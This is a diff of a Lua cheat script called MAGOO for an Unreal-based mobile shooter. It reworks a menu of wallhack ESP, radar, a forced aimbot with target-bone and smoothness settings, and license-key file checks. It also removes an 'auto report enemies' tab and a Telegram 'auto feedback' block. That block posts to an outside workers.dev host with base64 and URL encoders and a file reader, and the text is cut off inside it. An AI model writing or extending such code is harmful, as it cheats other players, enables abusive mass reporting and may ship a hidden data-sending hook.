+        if not IsValid(img) then return end
+        local slot = parent:AddChildToCanvas(img)
+        if slot then
+            slot:SetAutoSize(false)
+            slot:SetPosition(FVector2D(x, y))
+            slot:SetSize(FVector2D(size, size))
+            slot:SetZOrder(12)
+        end
+        SetImageBrush(img, path)
+    end)
+    if not IsValid(img) then
+        RoundedPanel(parent, x, y, size, size, 8, fallbackColor or C.IconESP, 10)
+    else
+        RoundedPanel(parent, x - 2, y - 2, size + 4, size + 4, 10, fallbackColor or C.IconESP, 10)
+    end
+    return img
+end
 local function RenderSidebar()
     if not IsValid(sidebarContainer) then return end
-    -- debounce: skip rapid double-calls (lag fix for tab switching)
-    local _now = os.clock()
-    if (_G._MagooRenderSidebarLast or 0) + 0.03 > _now then return end
-    _G._MagooRenderSidebarLast = _now
     sidebarContainer:ClearChildren()
     RoundedPanel(sidebarContainer, 0, 0, SIDEBAR_W, SIDEBAR_H, 20, C.SidebarBg, 1)
-    Layer(sidebarContainer, SIDEBAR_W - 1, 4, 1, SIDEBAR_H - 8, C.SidebarSep or FLinearColor(0.00, 0.80, 1.00, 0.18), 20)
     local tabs = {
-        { id = "DEAD_EYE", name = "DEAD EYE", y = 4,   h = 50, col = C.IconESP },
-        { id = "FUCK_AIM", name = "FUCK AIM", y = 54,  h = 50, col = C.IconAim },
-        { id = "GAME_OPT", name = "GAME OPT", y = 104, h = 50, col = C.IconMem },
-        { id = "DANGER",   name = "DANGER",   y = 154, h = 50, col = C.CloseCross or C.IconAim },
-        { id = "WORLD",    name = "WORLD",    y = 204, h = 50, col = C.IconESP },
-        { id = "USER",     name = "User",     y = 254, h = 50, col = C.IconUser },
+        { id = "DEAD_EYE", name = "DEAD EYE", y = 8,   h = 80, path = "/Game/UMG/Texture/Lobby_NoAtlas/Corps/Corps_Icon_Battle.Corps_Icon_Battle", col = C.IconESP },
+        { id = "FUCK_AIM", name = "FUCK AIM", y = 96,  h = 80, path = "/Game/Arts/UI/TableIcons/ItemIcon/WeaponCoat/Icon_M_WEP_M416_int_M_Coat_256.Icon_M_WEP_M416_int_M_Coat_256", col = C.IconAim },
+        { id = "GAME_OPT", name = "GAME OPT", y = 184, h = 80, path = "/Game/UMG/Texture/Lobby_NoAtlas/ESport/ESport_Icon_256.ESport_Icon_256", col = C.IconMem },
+        { id = "USER",     name = "User",     y = 272, h = 70, path = "/Game/Arts/UI/TableIcons/ItemIcon/Item/Icon_FriendProgress_256.Icon_FriendProgress_256", col = C.IconUser },
     }
     for _, tab in ipairs(tabs) do
         local isActive = (currentTab == tab.id)
         local tabY = tab.y
         if isActive then
             RoundedPanel(sidebarContainer, 0, tabY, SIDEBAR_W, tab.h, 12, C.SidebarActiveBg, 3)
-            local neon = C.NeonBar or FLinearColor(0.00, 0.90, 1.00, 1.00)
-            local soft = C.NeonBarSoft or FLinearColor(0.00, 0.90, 1.00, 0.30)
-            RoundedPanel(sidebarContainer, -2, tabY + 4, 8, tab.h - 8,  4, soft, 4)
-            RoundedPanel(sidebarContainer,  0, tabY + 6, 4, tab.h - 12, 2, neon, 6)
-            RoundedPanel(sidebarContainer,  1, tabY + 10, 2, tab.h - 20, 1, FLinearColor(1, 1, 1, 0.80), 7)
-        else
-            RoundedPanel(sidebarContainer, 2, tabY + 2, SIDEBAR_W - 4, tab.h - 4, 10, C.RowHover or FLinearColor(1,1,1,0.04), 2)
         end
         local textCol = isActive and C.TextActiveESP or C.TextDark
-        local iconCol = isActive and tab.col or FLinearColor(0.35, 0.40, 0.48, 0.75)
-        TabIcon(sidebarContainer, 26, tabY + 8, 30, tab.id, iconCol)
+        TabIcon(sidebarContainer, 26, tabY + 8, 30, tab.path, tab.col)
         Text(sidebarContainer, tab.name, 41.5, tabY + 48, 9, textCol, 12, 0.5, 0.5)
         local targetId = tab.id
         MakeBtn(sidebarContainer, 0, tabY, SIDEBAR_W, tab.h, 100, function()
@@ -13171,7 +11153,7 @@ local function MagooKeyTimeLeft()
             local base = "//storage/emulated/0/Android/data/" .. pkg .. "/files/"
             exp = tryRead(base .. "key_expiry.txt") or exp
             if not exp then
-                local raw = tryRead(base .. "key.txt")
+                local raw = tryRead(base .. "keys.txt")
                 if raw then exp = raw:match("\n([^\r\n]+)") or exp end
             end
             if exp and exp ~= "" then break end
@@ -13233,9 +11215,7 @@ end
 local function DrawParentRow(parent, labelText, yPos, expandKey)
     local open = _G._MagooMenuExpand[expandKey] == true
     local mark = open and "▼ " or "▶ "
-    -- cyan accent stripe on left of every category header
-    Layer(parent, 115, yPos + 6, 3, 18, C.CategorySquare or FLinearColor(0.00, 0.90, 1.00, 1.0), 11)
-    Text(parent, mark .. labelText, 124, yPos + 12, 13, C.TextCategory, 12, 0.0, 0.5)
+    Text(parent, mark .. labelText, 119, yPos + 12, 13, C.TextCategory, 12, 0.0, 0.5)
     MakeBtn(parent, 110, yPos - 2, 500, 30, 20, function()
         _G._MagooMenuExpand[expandKey] = not open
         RenderContent()
@@ -13243,10 +11223,6 @@ local function DrawParentRow(parent, labelText, yPos, expandKey)
 end
 function RenderContent()
     if not IsValid(contentContainer) then return end
-    -- debounce: skip if called again within same frame (tab-switch double-fire lag fix)
-    local _now = os.clock()
-    if (_G._MagooRenderContentLast or 0) + 0.03 > _now then return end
-    _G._MagooRenderContentLast = _now
     contentContainer:ClearChildren()
     _G.GTLMODConfig = _G.GTLMODConfig or {}
     local scroll = tonumber(_G._MagooContentScroll) or 0
@@ -13322,97 +11298,66 @@ function RenderContent()
         end
     elseif currentTab == "DEAD_EYE" then
         Text(contentContainer, "DEAD EYE♤", 365, 38, 16, C.TextTitle, 12, 0.5, 0.5)
-        Layer(contentContainer, 280, 50, 170, 2, C.HeaderLine or C.CategorySquare, 11)
         Layer(contentContainer, 119, 62, 12, 12, C.CategorySquare, 10)
         Text(contentContainer, "Supervision / ESP", 138, 68, 12, C.TextCategory, 12, 0.0, 0.5)
         Layer(contentContainer, 119, 84, 493, 1, C.DividerTop, 10)
-        
-        if IsFeatureLocked and IsFeatureLocked() then
-            Text(contentContainer, "KEY REQUIRED — features locked", 365, 100, 13, C.CloseCross or C.TextDark, 12, 0.5, 0.5)
-        end
-row("ESP MARK · 360 RADAR", "EspRadar")
-        row("AUTO SETUP", "EspBox")
+        row("ESP MARK · 360 RADAR", "EspRadar")
+        row("BOX ESP", "EspBox")
         row("ESP LINES", "EspLine")
-        do
-            local lineOn = _G.GTLMODConfig and (
-                _G.GTLMODConfig.EspLine == true
-                or _G.GTLMODConfig.EspLine == 1
-                or _G.GTLMODConfig.EspLine == "true"
-            )
-            if lineOn then
-                local colorLabels = {
-                    "   Line Color: Black",
-                    "   Line Color: White",
-                    "   Line Color: Red",
-                    "   Line Color: Green",
-                    "   Line Color: Blue",
-                    "   Line Color: Gold",
-                }
-                local cidx = tonumber(_G.GTLMODConfig.EspLineColor) or 6
-                if cidx < 1 then cidx = 1 end
-                if cidx > 6 then cidx = 6 end
-                Text(contentContainer, colorLabels[cidx], 119, y + 12, 13, C.TextDark, 12, 0.0, 0.5)
-                MakeBtn(contentContainer, 110, y, 520, 32, 20, function()
-                    local cur = tonumber(_G.GTLMODConfig.EspLineColor) or 6
-                    cur = cur + 1
-                    if cur > 6 then cur = 1 end
-                    _G.GTLMODConfig.EspLineColor = cur
-                    if _G.SaveModSettings then pcall(_G.SaveModSettings) end
-                    RenderContent()
-                end)
-                gap()
-            end
-        end
         row("PLAYER / BOT COUNTER", "CounterEnabled")
+        row("WEAPON ICON", "EspWeaponIcon")
         row("ACTIVE GRENADE WARNING", "EspActiveBom")
         drawScrollChrome()
     elseif currentTab == "FUCK_AIM" then
         Text(contentContainer, "FUCK AIM>", 365, 38, 16, C.TextTitle, 12, 0.5, 0.5)
-        Layer(contentContainer, 280, 50, 170, 2, C.HeaderLine or C.CategorySquare, 11)
         Layer(contentContainer, 119, 62, 12, 12, C.CategorySquare, 10)
         Text(contentContainer, "Aim / Crosshair", 138, 68, 12, C.TextCategory, 12, 0.0, 0.5)
         Layer(contentContainer, 119, 84, 493, 1, C.DividerTop, 10)
         row("FORCE AIMBOT (HIP)", "ForceAimbot")
-        local forceOn = _G.GTLMODConfig and (
-            _G.GTLMODConfig.ForceAimbot == true
-            or _G.GTLMODConfig.ForceAimbot == 1
-            or _G.GTLMODConfig.ForceAimbot == "true"
-            or _G._ForceAimbotWanted == true
-        )
-        if forceOn then
-            local boneLabels = { "   Target Area: Head", "   Target Area: Chest", "   Target Area: Stomach", "   Target Area: Pelvis" }
+        if _G.GTLMODConfig and _G.GTLMODConfig.ForceAimbot == true then
+            -- Target bone selector
+            local boneLabels = { "   Target: Head", "   Target: Chest", "   Target: Stomach", "   Target: Pelvis" }
             local boneIdx = tonumber(_G.GTLMODConfig.AimbotBone) or 1
             if boneIdx < 1 then boneIdx = 1 end
             if boneIdx > 4 then boneIdx = 4 end
-            Text(contentContainer, boneLabels[boneIdx], 119, y + 12, 13, C.TextDark, 12, 0.0, 0.5)
-            MakeBtn(contentContainer, 110, y, 520, 32, 20, function()
-                local cur = tonumber(_G.GTLMODConfig.AimbotBone) or 1
-                cur = cur + 1
-                if cur > 4 then cur = 1 end
-                _G.GTLMODConfig.AimbotBone = cur
-                if _G.SaveModSettings then pcall(_G.SaveModSettings) end
-                RenderContent()
-            end)
+            if y > 55 and y < 360 then
+                Text(contentContainer, boneLabels[boneIdx], 119, y + 12, 13, C.TextDark, 12, 0.0, 0.5)
+                MakeBtn(contentContainer, 110, y, 520, 32, 20, function()
+                    local cur = tonumber(_G.GTLMODConfig.AimbotBone) or 1
+                    cur = cur + 1
+                    if cur > 4 then cur = 1 end
+                    _G.GTLMODConfig.AimbotBone = cur
+                    RenderContent()
+                end)
+            end
             gap()
-            local sm = tonumber(_G.GTLMODConfig.AimbotSmoothness) or 40
-            if sm < 5 then sm = 5 end
-            if sm > 100 then sm = 100 end
-            Text(contentContainer, "   Smoothness: " .. tostring(sm), 119, y + 12, 13, C.TextDark, 12, 0.0, 0.5)
-            MakeBtn(contentContainer, 110, y, 520, 32, 20, function()
-                local cur = tonumber(_G.GTLMODConfig.AimbotSmoothness) or 40
-                cur = cur + 5
-                if cur > 100 then cur = 5 end
-                _G.GTLMODConfig.AimbotSmoothness = cur
-                if _G.SaveModSettings then pcall(_G.SaveModSettings) end
-                RenderContent()
-            end)
+            -- Smoothness slider (display + cycle)
+            local smoothVal = tonumber(_G.GTLMODConfig.AimbotSmoothness) or 45
+            if smoothVal < 10 then smoothVal = 10 end
+            if smoothVal > 90 then smoothVal = 90 end
+            if y > 55 and y < 360 then
+                Text(contentContainer, string.format("   Smoothness: %d", smoothVal), 119, y + 12, 13, C.TextDark, 12, 0.0, 0.5)
+                -- visual bar
+                local barW = 180
+                local fillW = math.floor(barW * (smoothVal / 90))
+                RoundedPanel(contentContainer, 360, y + 8, barW, 12, 6, C.ToggleOff, 12)
+                if fillW > 4 then
+                    RoundedPanel(contentContainer, 360, y + 8, fillW, 12, 6, C.ToggleOn, 13)
+                end
+                MakeBtn(contentContainer, 110, y, 520, 32, 20, function()
+                    local cur = tonumber(_G.GTLMODConfig.AimbotSmoothness) or 45
+                    cur = cur + 5
+                    if cur > 90 then cur = 10 end
+                    _G.GTLMODConfig.AimbotSmoothness = cur
+                    RenderContent()
+                end)
+            end
             gap()
         end
-        row("VISIBILITY CHECK", "AimTouchVisCheck")
+        row("SMALL CROSSHAIR", "PrivSmallCrosshair")
         drawScrollChrome()
     elseif currentTab == "GAME_OPT" then
         Text(contentContainer, "GAME OPTIMIZATION ●", 365, 38, 16, C.TextTitle, 12, 0.5, 0.5)
-        Layer(contentContainer, 280, 50, 170, 2, C.HeaderLine or C.CategorySquare, 11)
         Layer(contentContainer, 119, 62, 12, 12, C.CategorySquare, 10)
         Text(contentContainer, "Performance / Visual", 138, 68, 12, C.TextCategory, 12, 0.0, 0.5)
         Layer(contentContainer, 119, 84, 493, 1, C.DividerTop, 10)
@@ -13464,84 +11409,6 @@ row("ESP MARK · 360 RADAR", "EspRadar")
             row("   BLACK SKY", "BlackSky")
         end
         drawScrollChrome()
-    elseif currentTab == "DANGER" then
-        Text(contentContainer, "DANGER", 365, 38, 16, C.TextTitle, 12, 0.5, 0.5)
-        Layer(contentContainer, 280, 50, 170, 2, C.HeaderLine or C.CategorySquare, 11)
-        Layer(contentContainer, 119, 62, 12, 12, C.CategorySquare, 10)
-        Text(contentContainer, "High risk · use carefully", 138, 68, 12, C.TextCategory, 12, 0.0, 0.5)
-        Layer(contentContainer, 119, 84, 493, 1, C.DividerTop, 10)
-        row("AUTO REPORT ENEMIES", "AutoReport")
-        do
-            local arOn = _G.GTLMODConfig and (
-                _G.GTLMODConfig.AutoReport == true
-                or _G.GTLMODConfig.AutoReport == 1
-                or _G.GTLMODConfig.AutoReport == "true"
-            )
-            if arOn then
-                local reason = tonumber(_G.GTLMODConfig.AutoReportReason) or 1
-                if reason < 1 then reason = 1 end
-                if reason > 5 then reason = 5 end
-                local labels = {
-                    "   Report Type: Cheating",
-                    "   Report Type: Team up",
-                    "   Report Type: Abuse",
-                    "   Report Type: Name",
-                    "   Report Type: Other",
-                }
-                Text(contentContainer, labels[reason] or labels[1], 119, y + 12, 13, C.TextDark, 12, 0.0, 0.5)
-                MakeBtn(contentContainer, 110, y, 520, 32, 20, function()
-                    local cur = tonumber(_G.GTLMODConfig.AutoReportReason) or 1
-                    cur = cur + 1
-                    if cur > 5 then cur = 1 end
-                    _G.GTLMODConfig.AutoReportReason = cur
-                    if _G.AutoReportConfig then _G.AutoReportConfig.ReportReason = cur end
-                    if _G.SaveModSettings then pcall(_G.SaveModSettings) end
-                    RenderContent()
-                end)
-                gap()
-                local delay = tonumber(_G.GTLMODConfig.AutoReportDelay) or 3
-                if delay < 1 then delay = 1 end
-                Text(contentContainer, "   Report Delay: " .. tostring(delay) .. "s", 119, y + 12, 13, C.TextDark, 12, 0.0, 0.5)
-                MakeBtn(contentContainer, 110, y, 520, 32, 20, function()
-                    local cur = tonumber(_G.GTLMODConfig.AutoReportDelay) or 3
-                    cur = cur + 1
-                    if cur > 10 then cur = 1 end
-                    _G.GTLMODConfig.AutoReportDelay = cur
-                    if _G.AutoReportConfig then _G.AutoReportConfig.ReportDelay = cur end
-                    if _G.SaveModSettings then pcall(_G.SaveModSettings) end
-                    RenderContent()
-                end)
-                gap()
-            end
-        end
-        row("DUAL LOCK (optional)", "AutoReportDual")
-        row("FORCE TPP (FPP match)", "ForceTPP")
-        do
-            local lr = _G._MagooLastReport
-            local statusTxt
-            if not lr then
-                statusTxt = "Last report: none this match"
-            elseif lr.ok then
-                local hh = os.date("%H:%M:%S", lr.t or os.time())
-                local who = (lr.name and lr.name ~= "" and lr.name) or tostring(lr.key or "?")
-                statusTxt = "Last report: OK | " .. tostring(lr.reason or "") .. " | " .. tostring(who) .. " | " .. hh
-            else
-                local hh = os.date("%H:%M:%S", lr.t or os.time())
-                statusTxt = "Last report: FAIL | " .. tostring(lr.reason or "error") .. " | " .. hh
-            end
-            Text(contentContainer, statusTxt, 119, y + 12, 12, C.TextDark, 12, 0.0, 0.5)
-            gap()
-        end
-        drawScrollChrome()
-    elseif currentTab == "WORLD" then
-        Text(contentContainer, "WORLD · WEATHER", 365, 38, 16, C.TextTitle, 12, 0.5, 0.5)
-        Layer(contentContainer, 280, 50, 170, 2, C.HeaderLine or C.CategorySquare, 11)
-        Layer(contentContainer, 119, 62, 12, 12, C.CategorySquare, 10)
-        Text(contentContainer, "Environment", 138, 68, 12, C.TextCategory, 12, 0.0, 0.5)
-        Layer(contentContainer, 119, 84, 493, 1, C.DividerTop, 10)
-        row("RAIN", "WorldRain")
-        row("SNOW", "WorldSnow")
-        drawScrollChrome()
     else
         currentTab = "DEAD_EYE"
         RenderContent()
@@ -13562,11 +11429,9 @@ local function CreateTopPill(canvas)
     end
     SetVis(topPillContainer, "SelfHitTestInvisible")
     _G.SodaLite_TopPillContainer = topPillContainer
-    RoundedPanel(topPillContainer, 2, 5, pillW, pillH, pr, C.TopPillShadow, 1)              -- drop shadow
-    RoundedPanel(topPillContainer, -2, -2, pillW + 4, pillH + 4, pr + 2, FLinearColor(0.70, 0.04, 0.06, 0.22), 2) -- outer red halo
-    RoundedPanel(topPillContainer, -1, -1, pillW + 2, pillH + 2, pr + 1, C.TopPillOutline, 3) -- crisp red border
-    RoundedPanel(topPillContainer, 0, 0, pillW, pillH, pr, C.TopPillBg, 4)                  -- dark body
-    RoundedPanel(topPillContainer, 4, 1, pillW - 8, 2, 1, FLinearColor(1, 1, 1, 0.12), 5)  -- top glass shimmer
+    RoundedPanel(topPillContainer, 0, 3, pillW, pillH, pr, C.TopPillShadow, 1)
+    RoundedPanel(topPillContainer, -1, -1, pillW + 2, pillH + 2, pr + 1, C.TopPillOutline, 2)
+    RoundedPanel(topPillContainer, 0, 0, pillW, pillH, pr, C.TopPillBg, 3)
     clockTextBlock = Text(topPillContainer, os.date("%H:%M"), 45, 19, 13, C.TopPillClock, 10, 0.5, 0.5)
     Text(topPillContainer, "|", 88, 19, 12, C.TopPillDiv, 10, 0.5, 0.5)
     Text(topPillContainer, "MAGOO", 160, 19, 13, C.TopPillTitle, 10, 0.5, 0.5)
@@ -13598,122 +11463,9 @@ local function UpdateLayoutPositions(vpW, vpH)
         pcall(function() bgSlot:SetPosition(FVector2D(posX, posY)) end)
     end
 end
-
-
--- ========== MAGOO continuous menu glow (single instance, clipped inside menu) ==========
-_G._MagooMenuGlow = _G._MagooMenuGlow or { active = false, bars = {}, timer = nil, gen = 0, layer = nil }
-local function StopMenuGlow()
-    local g = _G._MagooMenuGlow
-    g.active = false
-    g.gen = (g.gen or 0) + 1   -- invalidate any running timer callbacks
-    g.timer = nil
-    -- remove bars first
-    for _, b in ipairs(g.bars or {}) do
-        pcall(function()
-            local w = b and b.widget
-            if w and slua.isValid(w) then w:RemoveFromParent() end
-        end)
-    end
-    g.bars = {}
-    -- remove clip layer
-    pcall(function()
-        if g.layer and slua.isValid(g.layer) then g.layer:RemoveFromParent() end
-    end)
-    g.layer = nil
-end
-local function StartMenuGlow(parent)
-    if not parent or not slua.isValid(parent) then return end
-    -- always full cleanup first so reopen never stacks
-    StopMenuGlow()
-    local g = _G._MagooMenuGlow
-    local myGen = (g.gen or 0) + 1
-    g.gen = myGen
-    g.active = true
-    g.bars = {}
-    pcall(function()
-        local LC = import("LinearColor")
-        if not LC then return end
-        local menuW = MENU_W or 640
-        local menuH = MENU_H or 411
-        -- dedicated layer sized exactly to the menu panel — bars live only here
-        local layer = NewObject("/Script/UMG.CanvasPanel", parent)
-        if not (layer and slua.isValid(layer)) then return end
-        local lslot = parent:AddChildToCanvas(layer)
-        if lslot then
-            lslot:SetAutoSize(false)
-            lslot:SetPosition(FVector2D(0, 0))
-            lslot:SetSize(FVector2D(menuW, menuH))
-            lslot:SetZOrder(9996)
-        end
-        SetVis(layer, "HitTestInvisible")
-        g.layer = layer
-        -- one soft white band + one soft black band, confined to [0, menuW]
-        local specs = {
-            { w = 70, a = 0.11, speed = 3.2, col = {1, 1, 1} },
-            { w = 50, a = 0.08, speed = 2.4, col = {0, 0, 0} },
-        }
-        for i, sp in ipairs(specs) do
-            local bar = CGame:NewObjectFromPath("/Script/UMG.Border", layer)
-            if bar and slua.isValid(bar) then
-                bar:SetBrushColor(LC(sp.col[1], sp.col[2], sp.col[3], sp.a))
-                bar:SetWidgetVisibility(UEnums.ESlateVisibility.HitTestInvisible)
-                local slot = layer:AddChildToCanvas(bar)
-                local startX = (i == 1) and 0 or math.floor(menuW * 0.45)
-                if slot then
-                    slot:SetAlignment(FVector2D(0, 0))
-                    slot:SetPosition(FVector2D(startX, 0))
-                    slot:SetSize(FVector2D(sp.w, menuH))
-                    slot:SetZOrder(1)
-                end
-                g.bars[#g.bars + 1] = {
-                    widget = bar, slot = slot, w = sp.w, speed = sp.speed,
-                    x = startX, a = sp.a, col = sp.col, dir = 1
-                }
-            end
-        end
-        local tk = package.loaded["common.time_ticker"] or require("common.time_ticker")
-        if not (tk and tk.AddTimerLoop) then return end
-        -- store gen in closure; ignore callbacks from old generations
-        g.timer = tk.AddTimerLoop(0, function()
-            if g.gen ~= myGen or not g.active or not isMenuOpen then
-                return
-            end
-            if not g.layer or not slua.isValid(g.layer) then
-                return
-            end
-            local mw = MENU_W or 640
-            for _, b in ipairs(g.bars) do
-                if b.slot and b.widget and slua.isValid(b.widget) then
-                    b.x = b.x + b.speed * b.dir
-                    -- bounce strictly inside [0, mw - w] so nothing draws outside the menu
-                    if b.x + b.w >= mw then
-                        b.x = mw - b.w
-                        b.dir = -1
-                        if b.col[1] > 0.5 then b.col = {0,0,0} else b.col = {1,1,1} end
-                        pcall(function()
-                            local LC2 = import("LinearColor")
-                            if LC2 then b.widget:SetBrushColor(LC2(b.col[1], b.col[2], b.col[3], b.a)) end
-                        end)
-                    elseif b.x <= 0 then
-                        b.x = 0
-                        b.dir = 1
-                        if b.col[1] > 0.5 then b.col = {0,0,0} else b.col = {1,1,1} end
-                        pcall(function()
-                            local LC2 = import("LinearColor")
-                            if LC2 then b.widget:SetBrushColor(LC2(b.col[1], b.col[2], b.col[3], b.a)) end
-                        end)
-                    end
-                    pcall(function() b.slot:SetPosition(FVector2D(b.x, 0)) end)
-                end
-            end
-        end, -1, 0.033)
-    end)
-end
--- ========== end menu glow ==========
-
 local function CloseMenu()
     isMenuOpen = false
-    pcall(StopMenuGlow)
+    pcall(MagooStopSweep)
     pcall(function()
         if IsValid(bgPanel) then
             SetVis(bgPanel, "Collapsed")
@@ -13734,40 +11486,15 @@ local function OpenMenu(canvas)
         local vpW, vpH = GetViewport()
         UpdateLayoutPositions(vpW, vpH)
         SetVis(bgPanel, "SelfHitTestInvisible")
-        -- light open scale-in (3 steps, ~180ms total, no continuous timer)
         pcall(function()
-            local base = GetMenuScale(vpW, vpH)
-            if bgPanel.SetRenderTransformPivot then bgPanel:SetRenderTransformPivot(FVector2D(0.5, 0.5)) end
-            if bgPanel.SetRenderScale then bgPanel:SetRenderScale(FVector2D(base * 0.96, base * 0.96)) end
-            if bgPanel.SetRenderOpacity then bgPanel:SetRenderOpacity(0.85) end
-            local tk = GetTicker and GetTicker() or nil
-            if not tk then tk = package.loaded["common.time_ticker"] end
-            if tk and tk.AddTimerOnce then
-                tk.AddTimerOnce(0.06, function()
-                    if not isMenuOpen or not IsValid(bgPanel) then return end
-                    pcall(function()
-                        bgPanel:SetRenderScale(FVector2D(base * 0.985, base * 0.985))
-                        if bgPanel.SetRenderOpacity then bgPanel:SetRenderOpacity(0.95) end
-                    end)
-                end)
-                tk.AddTimerOnce(0.12, function()
-                    if not isMenuOpen or not IsValid(bgPanel) then return end
-                    pcall(function()
-                        bgPanel:SetRenderScale(FVector2D(base, base))
-                        if bgPanel.SetRenderOpacity then bgPanel:SetRenderOpacity(1) end
-                    end)
-                end)
-            else
-                if bgPanel.SetRenderScale then bgPanel:SetRenderScale(FVector2D(base, base)) end
-                if bgPanel.SetRenderOpacity then bgPanel:SetRenderOpacity(1) end
-            end
+            if bgPanel.SetRenderOpacity then bgPanel:SetRenderOpacity(1) end
         end)
-        pcall(function() StopMenuGlow() StartMenuGlow(bgPanel) end)
     else
         if c then BuildMenu(c) end
     end
     if IsValid(topPillContainer) then SetVis(topPillContainer, "SelfHitTestInvisible") end
     if IsValid(floatContainer) then SetVis(floatContainer, "Collapsed") end
+    pcall(MagooStartSweep)
 end
 function ToggleMenu(canvas)
     if isMenuOpen then CloseMenu() else OpenMenu(canvas) end
@@ -13800,15 +11527,9 @@ function BuildMenu(canvas)
         bgPanel:SetRenderScale(FVector2D(s, s))
     end)
     local menuRadius = 25
-    -- depth stack: deep shadow -> cyan glow edge -> dark plate -> inner sheen -> top shimmer
-    RoundedPanel(bgPanel, 10, 14, MENU_W, MENU_H, menuRadius, FLinearColor(0, 0, 0, 0.55), 1)  -- deep drop shadow
-    RoundedPanel(bgPanel, 4,  6,  MENU_W, MENU_H, menuRadius, FLinearColor(0, 0, 0, 0.35), 2)  -- mid shadow layer
-    RoundedPanel(bgPanel, -3, -3, MENU_W + 6, MENU_H + 6, menuRadius + 3, C.Outline, 3)         -- blood-red outer glow
-    RoundedPanel(bgPanel, -1, -1, MENU_W + 2, MENU_H + 2, menuRadius + 1, FLinearColor(0.20, 0.30, 0.90, 0.22), 3) -- electric blue secondary halo
-    RoundedPanel(bgPanel, 0,  0,  MENU_W, MENU_H, menuRadius, C.WindowBg, 4)                    -- main dark body
-    RoundedPanel(bgPanel, 1,  1,  MENU_W - 2, MENU_H - 2, menuRadius - 1, FLinearColor(1, 1, 1, 0.04), 5) -- inner edge sheen
-    RoundedPanel(bgPanel, 14, 2,  MENU_W - 28, 3, 2, FLinearColor(1, 1, 1, 0.14), 6)           -- top glass shimmer
-    RoundedPanel(bgPanel, 14, 2,  MENU_W - 28, 1, 1, FLinearColor(0.25, 0.45, 1.00, 0.20), 7) -- blue shimmer tint
+    RoundedPanel(bgPanel, 4, 4, MENU_W, MENU_H, menuRadius, C.Shadow, 1)
+    RoundedPanel(bgPanel, -1, -1, MENU_W + 2, MENU_H + 2, menuRadius + 1, C.Outline, 2)
+    RoundedPanel(bgPanel, 0, 0, MENU_W, MENU_H, menuRadius, C.WindowBg, 3)
     sidebarContainer = NewObject("/Script/UMG.CanvasPanel", bgPanel)
     local sSlot = bgPanel:AddChildToCanvas(sidebarContainer)
     if sSlot then
@@ -13829,16 +11550,16 @@ function BuildMenu(canvas)
     end
     SetVis(contentContainer, "SelfHitTestInvisible")
     RenderContent()
-    RoundedPanel(bgPanel, 599, 7, 31, 27, 12, C.CloseBtnBg, 9990)
-    Text(bgPanel, "✕", 614.5, 20.5, 15, C.CloseCross, 9991, 0.5, 0.5)
+    RoundedPanel(bgPanel, 601, 9, 27, 23, 11, C.CloseBtnBg, 9990)
+    Text(bgPanel, "✕", 614.5, 20.5, 14, C.CloseCross, 9991, 0.5, 0.5)
     MakeBtn(bgPanel, 570, 0, 70, 50, 10000, function() CloseMenu() end)
     if IsValid(floatContainer) then SetVis(floatContainer, "Collapsed") end
     isMenuOpen = true
-    pcall(function() if IsValid(bgPanel) then StopMenuGlow() StartMenuGlow(bgPanel) end end)
     if IsValid(topPillContainer) then SetVis(topPillContainer, "SelfHitTestInvisible") end
     pcall(function()
         if bgPanel and bgPanel.SetRenderOpacity then bgPanel:SetRenderOpacity(1) end
     end)
+    pcall(MagooStartSweep)
 end
 local function CreateFloatButton(canvas)
     if IsValid(floatContainer) then return end
@@ -13942,7 +11663,7 @@ pcall(function()
                 end
             end)
         end
-    end, -1, 0.033)
+    end, -1, 0.016)
 end)
 local function InitWatcher()
     pcall(function()
@@ -13970,494 +11691,4 @@ local function InitWatcher()
 end
 InitWatcher()
 end)
-
-
--- ============================================================
--- AUTO FEEDBACK SYSTEM (Telegram) — integrated from feed.lua
--- Independent: does not alter ESP/aim/menu/license.
--- Installs only after authenticated runtime is live.
--- ============================================================
-pcall(function()
--- AUTO FEEDBACK SYSTEM (Telegram) - ALL RANKS SUPPORTED
--- ============================================================
-local AutoFeedback = {
-	Config = {
-		ServerURL = "https://mainautofeedback.arshan3321.workers.dev/",
-		TestMode = false
-	},
-	Hooked = false
-}
-
-local function AF_Log(message)
-	print(string.format("[MAGOO ][%s] %s", os.date("%H:%M:%S"), tostring(message)))
-end
-
-local function AF_Notify(message)
-	if _G.SRCHUBNotify then
-		pcall(_G.SRCHUBNotify, message)
-	end
-end
-
-local function AF_GetModule(name, allowRequire)
-	local loaded = package and package.loaded and package.loaded[name]
-	if loaded then return loaded end
-	if allowRequire == false then return nil end
-	local ok, module = pcall(require, name)
-	if ok then return module end
-	return nil
-end
-
-local function AF_AddTimerOnce(delay, callback)
-	local ticker = AF_GetModule("common.time_ticker")
-	if ticker and type(ticker.AddTimerOnce) == "function" then
-		ticker.AddTimerOnce(delay, callback)
-		return true
-	end
-	return false
-end
-
-local function AF_Base64Encode(data)
-	if type(data) ~= "string" or #data == 0 then return "" end
-	local alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
-	local output = {}
-	local outputIndex = 0
-	local index = 1
-	while index <= #data - 2 do
-		local a, b, c = string.byte(data, index, index + 2)
-		local value = a * 65536 + b * 256 + c
-		outputIndex = outputIndex + 1
-		output[outputIndex] = string.char(
-			string.byte(alphabet, math.floor(value / 262144) + 1),
-			string.byte(alphabet, math.floor(value / 4096) % 64 + 1),
-			string.byte(alphabet, math.floor(value / 64) % 64 + 1),
-			string.byte(alphabet, value % 64 + 1)
-		)
-		index = index + 3
-	end
-	local remaining = #data - index + 1
-	if remaining == 2 then
-		local a, b = string.byte(data, index, index + 1)
-		local value = a * 65536 + b * 256
-		outputIndex = outputIndex + 1
-		output[outputIndex] = string.char(
-			string.byte(alphabet, math.floor(value / 262144) + 1),
-			string.byte(alphabet, math.floor(value / 4096) % 64 + 1),
-			string.byte(alphabet, math.floor(value / 64) % 64 + 1),
-			string.byte("=")
-		)
-	elseif remaining == 1 then
-		local value = string.byte(data, index) * 65536
-		outputIndex = outputIndex + 1
-		output[outputIndex] = string.char(
-			string.byte(alphabet, math.floor(value / 262144) + 1),
-			string.byte(alphabet, math.floor(value / 4096) % 64 + 1),
-			string.byte("="),
-			string.byte("=")
-		)
-	end
-	return table.concat(output)
-end
-
-local function AF_UrlEncode(value)
-	if value == nil then return nil end
-	value = tostring(value):gsub("\n", "\r\n")
-	value = value:gsub("([^A-Za-z0-9 %-%_%.%~])", function(character)
-		return string.format("%%%02X", string.byte(character))
-	end)
-	value = value:gsub(" ", "+")
-	return value
-end
-
-local function AF_ReadFile(path)
-	local file = io.open(path, "rb")
-	if not file then return "" end
